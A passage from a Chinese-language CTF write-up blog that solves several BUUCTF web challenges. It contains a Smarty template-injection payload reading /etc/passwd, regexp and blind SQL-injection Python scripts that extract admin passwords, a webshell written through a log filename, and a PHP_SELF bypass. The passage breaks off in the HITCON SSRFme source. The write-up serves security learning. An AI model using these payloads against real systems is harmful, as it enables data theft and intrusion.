    <span class="token variable">$_result</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span> 
    <span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$variable</span><span class="token punctuation">,</span> <span class="token string">'r+'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$current_line</span> <span class="token operator">=</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
            <span class="token variable">$_result</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$current_line</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> 
        <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token variable">$_result</span><span class="token punctuation">;</span> 
    <span class="token punctuation">}</span> 
    <span class="token variable">$smarty</span> <span class="token operator">=</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">smarty</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">smarty</span> <span class="token punctuation">:</span> <span class="token variable">$this</span><span class="token punctuation">;</span> 
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$smarty</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error_unassigned</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">SmartyException</span><span class="token punctuation">(</span><span class="token string">'Undefined stream variable "'</span> <span class="token punctuation">.</span> <span class="token variable">$variable</span> <span class="token punctuation">.</span> <span class="token string">'"'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">}</span> 
    <span class="token keyword">else</span> <span class="token punctuation">{</span> 
        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span> 
    <span class="token punctuation">}</span> 
<span class="token punctuation">}</span></code></pre>
<p>方法可以读取一个文件并返回其内容，所以我们可以用self来获取Smarty对象并调用这个方法</p>
<p>payload</p>
<pre><code>{self::getStreamVariable(&quot;file:///etc/passwd&quot;)}</code></pre><p>2.{if}</p>
<blockquote>
<p>Smarty的{if}条件判断和PHP的if 非常相似，只是增加了一些特性。每个{if}必须有一个配对的{/if}. 也可以使用{else} 和 {elseif}. 全部的PHP条件表达式和函数都可以在if内使用，如<em>||</em>, or, &amp;&amp;, and, is_array(), 等等</p>
</blockquote>
<p>payload</p>
<pre><code>{if phpinfo()}{/if}</code></pre><blockquote>
<p>参考</p>
<p><a href="https://www.freebuf.com/column/219913.html" target="_blank" rel="noopener">https://www.freebuf.com/column/219913.html</a></p>
</blockquote>
<h1 id="NCTF2019-SQLi"><a href="#NCTF2019-SQLi" class="headerlink" title="[NCTF2019]SQLi"></a>[NCTF2019]SQLi</h1><p><strong>考点：regexp 注入</strong></p>
<p>进来给了登录框和查询语句。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201211113543181.png" srcset="/img/loading.gif" alt="image-20201211113543181"></p>
<p>常规扫一波后台，发现robots.txt。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201211112818680.png" srcset="/img/loading.gif" alt="image-20201211112818680"></p>
<p>直接给了黑名单。</p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$black_list</span> <span class="token operator">=</span> <span class="token string">"/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\'|=| |in|&lt;|>|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i"</span><span class="token punctuation">;</span>


<span class="token keyword">If</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'passwd'</span><span class="token punctuation">]</span> <span class="token operator">===</span> admin's password<span class="token punctuation">,</span>

Then you will get the flag<span class="token punctuation">;</span>

select <span class="token operator">*</span> from users where username<span class="token operator">=</span><span class="token string">''</span> <span class="token keyword">and</span> passwd<span class="token operator">=</span><span class="token string">''</span></code></pre>
<p> 下面就是构造语句查admin密码了。</p>
<p>虽然过滤了很多东西，但是regexp还在，</p>
<p>再用\转义掉 ‘ ，用/**/绕空格</p>
<p>payload</p>
<pre><code>username=\&amp;passwd=||/**/passwd/**/regexp/**/&quot;^a&quot;;%00</code></pre><p>看一下报文有啥区别好写脚本。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201211141802155.png" srcset="/img/loading.gif" alt="image-20201211141802155"></p>
<p>脚本</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> string
<span class="token keyword">import</span> requests
<span class="token keyword">from</span> urllib <span class="token keyword">import</span> parse

passwd <span class="token operator">=</span> <span class="token string">''</span>
string<span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> <span class="token string">'_'</span>
url <span class="token operator">=</span> <span class="token string">'http://9ba5ab21-ccbe-498c-aa7f-398794a7df36.node3.buuoj.cn'</span>

<span class="token keyword">for</span> n <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> m <span class="token keyword">in</span> string<span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string">"\\"</span><span class="token punctuation">,</span>
            <span class="token string">"passwd"</span><span class="token punctuation">:</span><span class="token string">"||/**/passwd/**/regexp/**/\"^{}\";{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token punctuation">(</span>passwd<span class="token operator">+</span>m<span class="token punctuation">)</span><span class="token punctuation">,</span>parse<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span><span class="token string">'%00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">'welcome'</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            passwd <span class="token operator">+=</span> m
            <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>
            <span class="token keyword">break</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span></code></pre>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201211143716927.png" srcset="/img/loading.gif" alt="image-20201211143716927"></p>
<p>直接post passwd</p>
<p>得到flag。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201211143746886.png" srcset="/img/loading.gif" alt="image-20201211143746886"></p>
<h1 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h1><p><strong>考点：文件泄露，盲注，php短标签</strong></p>
<p>啊。。熟悉的界面</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201211145016437.png" srcset="/img/loading.gif" alt="image-20201211145016437"></p>
<p>扫扫先</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201211145725380.png" srcset="/img/loading.gif" alt="image-20201211145725380"></p>
<p>备份文件泄露</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201211145847670.png" srcset="/img/loading.gif" alt="image-20201211145847670"></p>
<p>都试试，只有image.php</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string">"config.php"</span><span class="token punctuation">;</span>

<span class="token variable">$id</span><span class="token operator">=</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">"1"</span><span class="token punctuation">;</span>
<span class="token variable">$path</span><span class="token operator">=</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"path"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"path"</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">;</span>

<span class="token variable">$id</span><span class="token operator">=</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$path</span><span class="token operator">=</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$id</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"\\0"</span><span class="token punctuation">,</span><span class="token string">"%00"</span><span class="token punctuation">,</span><span class="token string">"\\'"</span><span class="token punctuation">,</span><span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$path</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"\\0"</span><span class="token punctuation">,</span><span class="token string">"%00"</span><span class="token punctuation">,</span><span class="token string">"\\'"</span><span class="token punctuation">,</span><span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token string">"select * from images where id='{$id}' or path='{$path}'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$row</span><span class="token operator">=</span><span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">,</span><span class="token constant">MYSQLI_ASSOC</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$path</span><span class="token operator">=</span><span class="token string">"./"</span> <span class="token punctuation">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">"path"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Type: image/jpeg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>这和上一道题差不多，还是用\转义，不过是多了个str_replace。后面就直接盲注。</p>
<p>exp</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span>  requests

url <span class="token operator">=</span> <span class="token string">"http://f1eec99b-3d95-4c68-91cb-f245f2684a39.node3.buuoj.cn/image.php?id=\\0&amp;path="</span>
payload1 <span class="token operator">=</span> <span class="token string">"or if(ascii(substr((select database()),{0},1))>{1},1,0)%23"</span>
payload2 <span class="token operator">=</span> <span class="token string">"or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{0},1))>{1},1,0)%23"</span>
payload3 <span class="token operator">=</span> <span class="token string">"or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273),{0},1))>{1},1,0)%23"</span>
payload4 <span class="token operator">=</span> <span class="token string">"or if(ascii(substr((select username from users),{0},1))>{1},1,0)%23"</span>
result <span class="token operator">=</span> <span class="token string">""</span>

<span class="token keyword">def</span> <span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload1 <span class="token operator">=</span> <span class="token string">"or if(ascii(substr((select database()),{0},1))>{1},1,0)%23"</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        l <span class="token operator">=</span> <span class="token number">1</span>
        r <span class="token operator">=</span> <span class="token number">130</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span>
        <span class="token keyword">while</span><span class="token punctuation">(</span>l<span class="token operator">&lt;</span>r<span class="token punctuation">)</span><span class="token punctuation">:</span>
            payloads <span class="token operator">=</span> payload1<span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token operator">+</span>payloads<span class="token punctuation">)</span>
            html <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>payloads<span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token string">"JFIF"</span> <span class="token keyword">in</span> html<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                l <span class="token operator">=</span> mid <span class="token operator">+</span><span class="token number">1</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                r <span class="token operator">=</span> mid
            mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span>
        result<span class="token operator">+=</span>chr<span class="token punctuation">(</span>mid<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
    <span class="token keyword">return</span> result

<span class="token keyword">def</span> <span class="token function">table_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    table_name<span class="token operator">=</span><span class="token string">""</span>
    payload2 <span class="token operator">=</span> <span class="token string">"or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{0},1))>{1},1,0)%23"</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        l <span class="token operator">=</span> <span class="token number">1</span>
        r <span class="token operator">=</span> <span class="token number">130</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span>
        <span class="token keyword">while</span><span class="token punctuation">(</span>l<span class="token operator">&lt;</span>r<span class="token punctuation">)</span><span class="token punctuation">:</span>
            payloads <span class="token operator">=</span> payload2<span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token operator">+</span>payloads<span class="token punctuation">)</span>
            html <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>payloads<span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token string">"JFIF"</span> <span class="token keyword">in</span> html<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                l <span class="token operator">=</span> mid <span class="token operator">+</span><span class="token number">1</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                r <span class="token operator">=</span> mid
            mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span>
        table_name<span class="token operator">+=</span>chr<span class="token punctuation">(</span>mid<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>
    <span class="token keyword">return</span> table_name

<span class="token keyword">def</span> <span class="token function">column_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    column_name<span class="token operator">=</span><span class="token string">""</span>
    table_name <span class="token operator">=</span> <span class="token string">"0x70617373776f7264"</span>
    payload3 <span class="token operator">=</span> <span class="token string">"or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273),{0},1))>{1},1,0)%23"</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        l <span class="token operator">=</span> <span class="token number">1</span>
        r <span class="token operator">=</span> <span class="token number">130</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span>
        <span class="token keyword">while</span><span class="token punctuation">(</span>l<span class="token operator">&lt;</span>r<span class="token punctuation">)</span><span class="token punctuation">:</span>
            payloads <span class="token operator">=</span> payload3<span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token operator">+</span>payloads<span class="token punctuation">)</span>
            html <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>payloads<span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token string">"JFIF"</span> <span class="token keyword">in</span> html<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                l <span class="token operator">=</span> mid <span class="token operator">+</span><span class="token number">1</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                r <span class="token operator">=</span> mid
            mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span>
        column_name<span class="token operator">+=</span>chr<span class="token punctuation">(</span>mid<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>
    <span class="token keyword">return</span> column_name

<span class="token keyword">def</span> <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    data<span class="token operator">=</span><span class="token string">""</span>
    payload4 <span class="token operator">=</span> <span class="token string">"or if(ascii(substr((select password from users),{0},1))>{1},1,0)%23"</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        l <span class="token operator">=</span> <span class="token number">1</span>
        r <span class="token operator">=</span> <span class="token number">130</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span>
        <span class="token keyword">while</span><span class="token punctuation">(</span>l<span class="token operator">&lt;</span>r<span class="token punctuation">)</span><span class="token punctuation">:</span>
            payloads <span class="token operator">=</span> payload4<span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token operator">+</span>payloads<span class="token punctuation">)</span>
            html <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>payloads<span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token string">"JFIF"</span> <span class="token keyword">in</span> html<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                l <span class="token operator">=</span> mid <span class="token operator">+</span><span class="token number">1</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                r <span class="token operator">=</span> mid
            mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span>
        data<span class="token operator">+=</span>chr<span class="token punctuation">(</span>mid<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    <span class="token keyword">return</span> data

<span class="token comment" spellcheck="true">#table_name()</span>
<span class="token comment" spellcheck="true">#column_name()</span>
data<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>
c0169285544b922a11ac</code></pre>
<p>随便上传一个文件，可以看到记录的是上传日志。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201211173715599.png" srcset="/img/loading.gif" alt="image-20201211173715599"></p>
<p>用文件名写马进去就可以了。</p>
<p>他把php过滤了</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201211174113431.png" srcset="/img/loading.gif" alt="image-20201211174113431"></p>
<p>那就用短标签绕过</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201211175156875.png" srcset="/img/loading.gif" alt="image-20201211175156875"></p>
<p>连shell找到flag。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201211175601541.png" srcset="/img/loading.gif" alt="image-20201211175601541"></p>
<h1 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h1><p>进来给了源码</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string">'config.php'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// FLAG is defined in config.php</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/config\.php\/*$/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
 <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"I don't know what you are thinking, but I won't let you read it :)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
 <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'guess'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
 <span class="token variable">$guess</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'guess'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">hash_equals</span><span class="token punctuation">(</span><span class="token variable">$secret</span><span class="token punctuation">,</span> <span class="token variable">$guess</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token string">'Congratulations! The flag is: '</span> <span class="token punctuation">.</span> <span class="token constant">FLAG</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
  <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token string">'Wrong.'</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<p>一开始，先看了下半部分的代码。大概意思取随机64位数，你post值和它相等就弹flag。</p>
<p>但实际上，问题出在上半部分。</p>
<p>PHP_SELF</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201211193934469.png" srcset="/img/loading.gif" alt="image-20201211193934469"></p>
<p>basename</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201211194114405.png" srcset="/img/loading.gif" alt="image-20201211194114405"></p>
<p>那么这段代码，</p>
<p>比如url中传入a.php/b.php</p>
<p>执行的是a.php</p>
<p>$_SERVER[‘PHP_SELF’]=a.php/b.php</p>
<p>而basename($_SERVER[‘PHP_SELF’])=b.php</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/config\.php\/*$/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//限制结尾出现config.php</span>
 <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"I don't know what you are thinking, but I won't let you read it :)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
 <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>绕正则的config.php，用不可见字符绕过。</p>
<p>payload</p>
<pre><code>/index.php/config.php/%80?source</code></pre><h1 id="HITCON-2017-SSRFme"><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h1><p><strong>考点：perl中 GET open漏洞</strong></p>
<p>进来给了源码</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$http_x_headers</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$http_x_headers</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">echo</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string">"sandbox/"</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">"orange"</span> <span class="token punctuation">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    @<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
